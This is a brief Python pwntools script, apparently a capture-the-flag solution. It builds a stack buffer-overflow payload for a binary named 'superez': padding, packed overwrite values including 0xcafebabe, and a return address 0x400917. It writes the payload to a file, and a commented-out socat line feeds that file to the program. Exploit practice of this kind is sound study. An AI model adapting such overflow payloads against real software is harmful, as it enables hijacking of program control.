#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

expl=b"A"*0x60+p64(0x0000000500004500)+p64(0x00008a3b000000bf)+p64(0x010004157f1c0300)+p64(0x170f12001a131100)+p64(0x0000000000000016)+p64(0x0000000000000000)+p64(0x0000000fffffd500)+p64(0x000000000000000f)+p64(0xcafebabe)+p64(0x400917)+b"\n"


with open("expl.txt", 'wb') as f:
    f.write(expl)

#from os import system
#system("cat expl.txt | socat - EXEC:'./superez',pty,setsid,ctty")
